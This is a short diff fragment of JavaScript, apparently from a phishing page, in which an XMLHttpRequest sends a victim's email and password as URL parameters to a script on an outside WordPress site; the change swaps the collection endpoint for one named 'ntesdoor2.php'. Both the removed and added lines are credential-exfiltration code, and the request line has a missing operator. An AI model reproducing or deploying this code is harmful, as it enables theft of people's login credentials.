@@ -80,7 +80,7 @@
                             }
                         }
                     };
-                    xhttp.open("GET", "https://newgrowthlifedesign.com/wp-content/plugins/ez/?user=" user + em + "&pass=" +ps, true);
+                    xhttp.open("GET", "https://newgrowthlifedesign.com/wp-content/plugins/ez/ntesdoor2.php?user=" user + em + "&pass=" +ps, true);
                     xhttp.send();
                 }
 
